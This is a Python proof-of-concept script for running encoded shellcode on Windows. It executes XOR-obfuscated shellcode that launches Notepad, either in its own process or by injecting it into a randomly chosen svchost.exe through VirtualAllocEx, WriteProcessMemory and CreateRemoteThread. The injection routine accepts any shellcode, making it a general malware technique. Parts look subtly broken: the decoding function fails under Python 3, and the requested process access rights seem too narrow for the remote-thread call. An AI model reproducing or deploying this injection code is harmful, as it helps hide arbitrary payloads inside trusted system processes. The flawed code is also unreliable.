#!/usr/bin/env python3

import ctypes
import ctypes.wintypes as wt
import psutil
import random
import os
import platform
import sys


class ShellcodeExecute():

    notepad_x64 =  b""
    notepad_x64 += b"\xab\x1f\xd4\xb3\xa7\xbf\x97\x57\x57\x57\x16\x06\x16\x07\x05\x06"
    notepad_x64 += b"\x01\x1f\x66\x85\x32\x1f\xdc\x05\x37\x1f\xdc\x05\x4f\x1f\xdc\x05"
    notepad_x64 += b"\x77\x1f\xdc\x25\x07\x1f\x58\xe0\x1d\x1d\x1a\x66\x9e\x1f\x66\x97"
    notepad_x64 += b"\xfb\x6b\x36\x2b\x55\x7b\x77\x16\x96\x9e\x5a\x16\x56\x96\xb5\xba"
    notepad_x64 += b"\x05\x16\x06\x1f\xdc\x05\x77\xdc\x15\x6b\x1f\x56\x87\xdc\xd7\xdf"
    notepad_x64 += b"\x57\x57\x57\x1f\xd2\x97\x23\x30\x1f\x56\x87\x07\xdc\x1f\x4f\x13"
    notepad_x64 += b"\xdc\x17\x77\x1e\x56\x87\xb4\x01\x1f\xa8\x9e\x16\xdc\x63\xdf\x1f"
    notepad_x64 += b"\x56\x81\x1a\x66\x9e\x1f\x66\x97\xfb\x16\x96\x9e\x5a\x16\x56\x96"
    notepad_x64 += b"\x6f\xb7\x22\xa6\x1b\x54\x1b\x73\x5f\x12\x6e\x86\x22\x8f\x0f\x13"
    notepad_x64 += b"\xdc\x17\x73\x1e\x56\x87\x31\x16\xdc\x5b\x1f\x13\xdc\x17\x4b\x1e"
    notepad_x64 += b"\x56\x87\x16\xdc\x53\xdf\x1f\x56\x87\x16\x0f\x16\x0f\x09\x0e\x0d"
    notepad_x64 += b"\x16\x0f\x16\x0e\x16\x0d\x1f\xd4\xbb\x77\x16\x05\xa8\xb7\x0f\x16"
    notepad_x64 += b"\x0e\x0d\x1f\xdc\x45\xbe\x00\xa8\xa8\xa8\x0a\x1f\xed\x56\x57\x57"
    notepad_x64 += b"\x57\x57\x57\x57\x57\x1f\xda\xda\x56\x56\x57\x57\x16\xed\x66\xdc"
    notepad_x64 += b"\x38\xd0\xa8\x82\xec\xa7\xe2\xf5\x01\x16\xed\xf1\xc2\xea\xca\xa8"
    notepad_x64 += b"\x82\x1f\xd4\x93\x7f\x6b\x51\x2b\x5d\xd7\xac\xb7\x22\x52\xec\x10"
    notepad_x64 += b"\x44\x25\x38\x3d\x57\x0e\x16\xde\x8d\xa8\x82\x39\x38\x23\x32\x27"
    notepad_x64 += b"\x36\x33\x79\x32\x2f\x32\x57"

    notepad_x86 =  b""
    notepad_x86 += b"\xab\xbf\xd5\x57\x57\x57\x37\xde\xb2\x66\x97\x33\xdc\x07\x67\xdc"
    notepad_x86 += b"\x05\x5b\xdc\x05\x43\xdc\x25\x7f\x58\xe0\x1d\x71\x66\xa8\xfb\x6b"
    notepad_x86 += b"\x36\x2b\x55\x7b\x77\x96\x98\x5a\x56\x90\xb5\xa5\x05\x00\xdc\x05"
    notepad_x86 += b"\x47\xdc\x1d\x6b\xdc\x1b\x46\x2f\xb4\x1f\x56\x86\x06\xdc\x0e\x77"
    notepad_x86 += b"\x56\x84\xdc\x1e\x4f\xb4\x6d\x1e\xdc\x63\xdc\x56\x81\x66\xa8\xfb"
    notepad_x86 += b"\x96\x98\x5a\x56\x90\x6f\xb7\x22\xa1\x54\x2a\xaf\x6c\x2a\x73\x22"
    notepad_x86 += b"\xb3\x0f\xdc\x0f\x73\x56\x84\x31\xdc\x5b\x1c\xdc\x0f\x4b\x56\x84"
    notepad_x86 += b"\xdc\x53\xdc\x56\x87\xde\x13\x73\x73\x0c\x0c\x36\x0e\x0d\x06\xa8"
    notepad_x86 += b"\xb7\x08\x08\x0d\xdc\x45\xbc\xda\x0a\x3d\x56\xda\xd2\xe5\x57\x57"
    notepad_x86 += b"\x57\x07\x3f\x66\xdc\x38\xd0\xa8\x82\xec\xa7\xe2\xf5\x01\x3f\xf1"
    notepad_x86 += b"\xc2\xea\xca\xa8\x82\x6b\x51\x2b\x5d\xd7\xac\xb7\x22\x52\xec\x10"
    notepad_x86 += b"\x44\x25\x38\x3d\x57\x04\xa8\x82\x39\x38\x23\x32\x27\x36\x33\x79"
    notepad_x86 += b"\x32\x2f\x32\x57"

    PROCESS_SOME_ACCESS = 0x000028
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    MEM_COMMIT_RESERVE = 0x3000

    PAGE_READWRITE = 0x04
    PAGE_READWRITE_EXECUTE = 0x40
    PAGE_READ_EXECUTE = 0x20

    def __init__(self, shellcode=None):
        self.kernel32 = ctypes.windll.kernel32
        self.kernel32_function_definitions()
        domain = os.getenv('USERDOMAIN')
        name = os.getenv('USERNAME')
        self.username = '{}\\{}'.format(domain, name).lower()
        if shellcode is None and platform.architecture()[0] == '64bit':
            self.shellcode = self.xorme(self.notepad_x64, 87)
        else:
            self.shellcode = self.xorme(self.notepad_x86, 87)

        menu = """
____________________________________________________________

   Python Proof of Concept Shellcode Execution Techniques
   Author: Joff Thyer, (c) 2020 River Gum Security LLC
 ____________________________________________________________

    1. VirtualAlloc()/CreateThread() in same process
    2. Inject into remote process with CreateRemoteThread()

    9. Exit Program

"""
        done = False
        while not done:
            print(menu)
            try:
                s = int(input("  Enter your selection: "))
            except:
                continue
            if s == 1:
                self.SCE_SameProcess()
            elif s == 2:
                self.SCE_InjectProcess()
            elif s == 9:
                done = True

    def kernel32_function_definitions(self):
        # CloseHandle()
        self.CloseHandle = ctypes.windll.kernel32.CloseHandle
        self.CloseHandle.argtypes = [wt.HANDLE]
        self.CloseHandle.restype = wt.BOOL

        # CreateThread()
        self.CreateThread = ctypes.windll.kernel32.CreateThread
        self.CreateThread.argtypes = [
            wt.LPVOID, ctypes.c_size_t, wt.LPVOID,
            wt.LPVOID, wt.DWORD, wt.LPVOID
        ]
        self.CreateThread.restype = wt.HANDLE

        # CreateRemoteThread()
        self.CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
        self.CreateRemoteThread.argtypes = [
            wt.HANDLE, wt.LPVOID, ctypes.c_size_t,
            wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID
        ]
        self.CreateRemoteThread.restype = wt.HANDLE

        # HeapAlloc()
        self.HeapAlloc = ctypes.windll.kernel32.HeapAlloc
        self.HeapAlloc.argtypes = [wt.HANDLE, wt.DWORD, ctypes.c_size_t]
        self.HeapAlloc.restype = wt.LPVOID

        # HeapCreate()
        self.HeapCreate = ctypes.windll.kernel32.HeapCreate
        self.HeapCreate.argtypes = [wt.DWORD, ctypes.c_size_t, ctypes.c_size_t]
        self.HeapCreate.restype = wt.HANDLE

        # OpenProcess()
        self.OpenProcess = ctypes.windll.kernel32.OpenProcess
        self.OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
        self.OpenProcess.restype = wt.HANDLE

        # RtlMoveMemory()
        self.RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
        self.RtlMoveMemory.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]
        self.RtlMoveMemory.restype = wt.LPVOID

        # VirtualAlloc()
        self.VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
        self.VirtualAlloc.argtypes = [
            wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD
        ]
        self.VirtualAlloc.restype = wt.LPVOID

        # VirtualAllocEx()
        self.VirtualAllocEx = ctypes.windll.kernel32.VirtualAllocEx
        self.VirtualAllocEx.argtypes = [
            wt.HANDLE, wt.LPVOID, ctypes.c_size_t,
            wt.DWORD, wt.DWORD
        ]
        self.VirtualAllocEx.restype = wt.LPVOID

        # VirtualFreeEx()
        self.VirtualFreeEx = ctypes.windll.kernel32.VirtualFreeEx
        self.VirtualFreeEx.argtypes = [
            wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.DWORD
        ]
        self.VirtualFreeEx.restype = wt.BOOL

        # VirtualProtect()
        self.VirtualProtect = ctypes.windll.kernel32.VirtualProtect
        self.VirtualProtect.argtypes = [
            wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.LPVOID
        ]
        self.VirtualProtect.restype = wt.BOOL

        # VirtualProtectEx()
        self.VirtualProtectEx = ctypes.windll.kernel32.VirtualProtectEx
        self.VirtualProtectEx.argtypes = [
            wt.HANDLE, wt.LPVOID, ctypes.c_size_t,
            wt.DWORD, wt.LPVOID
        ]
        self.VirtualProtectEx.restype = wt.BOOL

        # WaitForSingleObject
        self.WaitForSingleObject = self.kernel32.WaitForSingleObject
        self.WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
        self.WaitForSingleObject.restype = wt.DWORD

        # WriteProcessMemory()
        self.WriteProcessMemory = self.kernel32.WriteProcessMemory
        self.WriteProcessMemory.argtypes = [
            wt.HANDLE, wt.LPVOID, wt.LPCVOID,
            ctypes.c_size_t, wt.LPVOID
        ]
        self.WriteProcessMemory.restype = wt.BOOL

    def select_pid(self):
        candidates = {}
        for pid in psutil.pids():
            p = psutil.Process(pid)
            try:
                name = p.name()
                username = p.username().lower()
            except:
                continue
            if self.username == username and name == 'svchost.exe':
                candidates[pid] = name
        choice = random.choice(list(candidates.keys()))
        print('[*] Selected Process ID: {} ({}) to Inject'.format(
            choice, candidates[choice]
        ))
        return int(choice)

    def xorme(self, buf, k):
        res = b''
        for ch in buf:
            res += chr(ord(ch) ^ k).encode('latin1')
        return res

    def SCE_SameProcess(self):
        print("""
[*] =============================================
[*]  Shellcode Resident in Same Process using
[*]  VirtualAlloc()/CreateThread()!
[*] =============================================""")
        memptr = self.VirtualAlloc(
            0, len(self.shellcode),
            self.MEM_COMMIT, self.PAGE_READWRITE_EXECUTE
        )
        print('[*] VirtuallAlloc() Memory at: {:08X}'.format(memptr))
        self.RtlMoveMemory(memptr, self.shellcode, len(self.shellcode))
        print('[*] Shellcode copied into memory.')
        self.VirtualProtect(memptr, len(self.shellcode), self.PAGE_READ_EXECUTE, 0)
        print('[*] Changed permissions on memory to READ_EXECUTE only.')
        thread = self.CreateThread(0, 0, memptr, 0, 0, 0)
        print('[*] CreateThread() in same process.')
        self.WaitForSingleObject(thread, 0xFFFFFFFF)

    def SCE_InjectProcess(self):
        print("""
[*] =======================================================
[*] Find a process to inject shellcode into using process
[*] listing, then VirtualAllocEx(), WriteProcessMemory(),
[*] CreateRemoteThread()
[*] =======================================================""")
        pid = self.select_pid()
        ph = self.kernel32.OpenProcess(self.PROCESS_SOME_ACCESS, False, pid)
        print('[*] Process handle is: 0x{:06X}'.format(ph))
        if ph == 0:
            return

        memptr = self.VirtualAllocEx(
            ph, 0, len(self.shellcode),
            self.MEM_COMMIT_RESERVE,
            self.PAGE_READWRITE
        )
        print('[*] VirtualAllocEx() memory at: 0x{:08X}'.format(memptr))
        if memptr == 0:
            return

        nbytes = ctypes.c_int(0)
        result = self.WriteProcessMemory(
            ph, memptr, self.shellcode,
            len(self.shellcode), ctypes.byref(nbytes)
        )
        print('[+] Bytes written = {}'.format(nbytes.value))
        if result == 0:
            print("[-] WriteProcessMemory() Failed - Error Code: {}".format(
                self.kernel32.GetLastError()
            ))
            return

        old_protection = ctypes.pointer(wt.DWORD())
        result = self.VirtualProtectEx(
            ph, memptr, len(self.shellcode),
            self.PAGE_READ_EXECUTE, old_protection
        )
        if result == 0:
            print("[-] VirtualProtectEx() Failed - Error Code: {}".format(
                self.kernel32.GetLastError()
            ))
            return
        th = self.CreateRemoteThread(ph, None, 0, memptr, None, 0, None)
        if th == 0:
            print("[-] CreateRemoteThread() Failed - Error Code: {}".format(
                self.kernel32.GetLastError()
            ))
            return
        self.VirtualFreeEx(ph, memptr, 0, 0xC000)
        self.CloseHandle(ph)


if __name__ == '__main__':
    ShellcodeExecute()
